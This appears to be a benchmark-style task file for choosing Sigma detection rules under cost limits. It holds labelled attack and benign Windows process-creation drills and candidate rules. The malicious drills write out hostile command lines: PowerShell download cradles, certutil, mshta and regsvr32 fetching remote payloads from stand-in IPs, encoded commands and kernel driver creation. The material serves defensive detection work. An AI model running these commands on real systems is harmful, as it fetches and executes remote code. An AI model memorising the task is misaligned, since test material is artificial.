@@ -1,0 +1,343 @@
+title: Q4 Sigma Rule Deployment Review
+description: >-
+  Fill the highest-severity known detection blind spots in a single maintenance window.
+  The corpus contains manually triaged attack drills and benign normal-operation drills.
+  A plan is the post-change rule set; baseline rules only establish the old true-positive
+  hits that must remain covered.
+
+constraints:
+  capacity: 4
+  max_rules: 3
+  retain_old_hits: true
+  max_false_positives: 0
+
+baseline: |
+  title: Legacy PowerShell Encoded Command (Hidden Window)
+  name: old_ps_encoded
+  status: deprecated
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      CommandLine|contains|all:
+        - 'powershell'
+        - '-EncodedCommand'
+        - '-w hidden'
+    condition: selection
+  ---
+  title: Legacy PowerShell Download
+  name: old_ps_download
+  status: deprecated
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      CommandLine|contains|all:
+        - 'powershell'
+        - 'Invoke-WebRequest'
+    condition: selection
+
+cases:
+  - id: A0
+    label: malicious
+    severity: critical
+    description: Office document spawns PowerShell (phishing execution chain)
+    timestamp: 2026-11-20T09:01:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
+      CommandLine: 'powershell.exe -NoP -Command "whoami"'
+
+  - id: A1
+    label: malicious
+    severity: critical
+    description: Hidden encoded PowerShell, old encoded-command hit
+    timestamp: 2026-11-20T09:02:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA='
+
+  - id: A2
+    label: malicious
+    severity: critical
+    description: Readable IEX WebClient download cradle
+    timestamp: 2026-11-20T09:03:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'powershell.exe -NoP -Command "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.77/a.ps1'')"'
+
+  - id: A3
+    label: malicious
+    severity: critical
+    description: Encoded PowerShell without hidden-window/readable markers
+    timestamp: 2026-11-20T09:04:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA='
+
+  - id: A4
+    label: malicious
+    severity: high
+    description: PowerShell Invoke-WebRequest payload download, old download hit
+    timestamp: 2026-11-20T09:05:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'powershell.exe -NoP -Command "Invoke-WebRequest http://203.0.113.88/b.exe -OutFile C:\\Users\\Public\\b.exe"'
+
+  - id: A5
+    label: malicious
+    severity: high
+    description: Certutil URL cache download
+    timestamp: 2026-11-20T09:06:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\certutil.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.99/p.bin C:\\Users\\Public\\p.bin'
+
+  - id: A6
+    label: malicious
+    severity: critical
+    description: MSHTA remote HTA execution
+    timestamp: 2026-11-20T09:07:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\mshta.exe'
+      ParentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE'
+      CommandLine: 'mshta.exe http://203.0.113.42/launch.hta'
+
+  - id: A7
+    label: malicious
+    severity: medium
+    description: Regsvr32 Squiblydoo remote scriptlet
+    timestamp: 2026-11-20T09:08:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\regsvr32.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'regsvr32.exe /s /u /i:http://203.0.113.55/p.sct scrobj.dll'
+
+  - id: A8
+    label: malicious
+    severity: critical
+    description: Kernel driver service creation (no candidate covers this technique)
+    timestamp: 2026-11-20T09:09:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\sc.exe'
+      ParentImage: 'C:\\Windows\\System32\\cmd.exe'
+      CommandLine: 'sc.exe create EvilDriver type= kernel binPath= C:\\Users\\Public\\evil.sys'
+
+  - id: A9
+    label: malicious
+    severity: high
+    description: Rundll32 JavaScript execution (no candidate covers this technique)
+    timestamp: 2026-11-20T09:10:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\rundll32.exe'
+      ParentImage: 'C:\\Windows\\System32\\cmd.exe'
+      CommandLine: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(''javascript:alert(1)'');close()'
+
+  - id: B1
+    label: benign
+    severity: low
+    description: Normal admin PowerShell inventory script (unencoded)
+    timestamp: 2026-11-20T10:01:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+      ParentImage: 'C:\\Windows\\System32\\taskeng.exe'
+      CommandLine: 'powershell.exe -NoProfile -File C:\\Scripts\\Inventory.ps1'
+
+  - id: B2
+    label: benign
+    severity: low
+    description: Certutil hash verification during normal drill
+    timestamp: 2026-11-20T10:02:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\certutil.exe'
+      ParentImage: 'C:\\Windows\\System32\\cmd.exe'
+      CommandLine: 'certutil.exe -hashfile C:\\Temp\\payload.bin SHA256'
+
+  - id: B3
+    label: benign
+    severity: low
+    description: Local intranet HTA application
+    timestamp: 2026-11-20T10:03:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\mshta.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'mshta.exe C:\\Program Files\\Contoso\\app.hta'
+
+  - id: B4
+    label: benign
+    severity: low
+    description: Local DLL registration during install
+    timestamp: 2026-11-20T10:04:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\regsvr32.exe'
+      ParentImage: 'C:\\Windows\\System32\\msiexec.exe'
+      CommandLine: 'regsvr32.exe /s C:\\Program Files\\Contoso\\plugin.dll'
+
+  - id: B5
+    label: benign
+    severity: low
+    description: Printer UI help invocation
+    timestamp: 2026-11-20T10:05:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\rundll32.exe'
+      ParentImage: 'C:\\Windows\\explorer.exe'
+      CommandLine: 'rundll32.exe printui.dll,PrintUIEntry /?'
+
+  - id: B6
+    label: benign
+    severity: low
+    description: Service inventory query
+    timestamp: 2026-11-20T10:06:00Z
+    logsource: {category: process_creation, product: windows}
+    data:
+      Image: 'C:\\Windows\\System32\\sc.exe'
+      ParentImage: 'C:\\Windows\\System32\\cmd.exe'
+      CommandLine: 'sc.exe query type= service state= all'
+
+candidates:
+  - id: P
+    cost: 1
+    description: Common Office-to-PowerShell parent/child precondition
+    rule: |
+      title: Office Process Spawns PowerShell
+      name: P
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\\powershell.exe'
+          ParentImage|endswith:
+            - '\\winword.exe'
+            - '\\excel.exe'
+            - '\\powerpnt.exe'
+        condition: selection
+
+  - id: A
+    cost: 2
+    group: powershell-rewrite
+    requires: [P]
+    description: Strict behavioural PowerShell variant (hidden encoding, readable IEX cradle, IWR)
+    rule: |
+      title: PowerShell Strict Behavioural Variant
+      name: A
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        encoded:
+          CommandLine|contains: '-EncodedCommand'
+        hiding:
+          CommandLine|contains:
+            - '-W Hidden'
+            - '-WindowStyle Hidden'
+            - 'FromBase64String'
+        cradle:
+          CommandLine|contains|all:
+            - 'powershell'
+            - 'IEX'
+            - 'Net.WebClient'
+        download:
+          CommandLine|contains|all:
+            - 'powershell'
+            - 'Invoke-WebRequest'
+        condition: (encoded and hiding) or cradle or download
+
+  - id: B
+    cost: 2
+    group: powershell-rewrite
+    requires: [P]
+    description: Broad encoded-command variant (any encoded command, plus IWR)
+    rule: |
+      title: PowerShell Broad Encoded Variant
+      name: B
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        encoded:
+          CommandLine|contains|all:
+            - 'powershell'
+            - '-EncodedCommand'
+        download:
+          CommandLine|contains|all:
+            - 'powershell'
+            - 'Invoke-WebRequest'
+        condition: encoded or download
+
+  - id: C
+    cost: 1
+    description: Certutil URL-cache download
+    rule: |
+      title: Certutil URL Cache Download
+      name: C
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\\certutil.exe'
+          CommandLine|contains|all:
+            - '-urlcache'
+            - '-f'
+        condition: selection
+
+  - id: D
+    cost: 2
+    description: MSHTA remote HTA execution
+    rule: |
+      title: MSHTA Remote HTA
+      name: D
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\\mshta.exe'
+          CommandLine|contains: 'http'
+        condition: selection
+
+  - id: E
+    cost: 1
+    description: Regsvr32 Squiblydoo remote scriptlet
+    rule: |
+      title: Regsvr32 Remote Scriptlet
+      name: E
+      status: experimental
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\\regsvr32.exe'
+          CommandLine|contains|all:
+            - '/i:http'
+            - 'scrobj.dll'
+        condition: selection
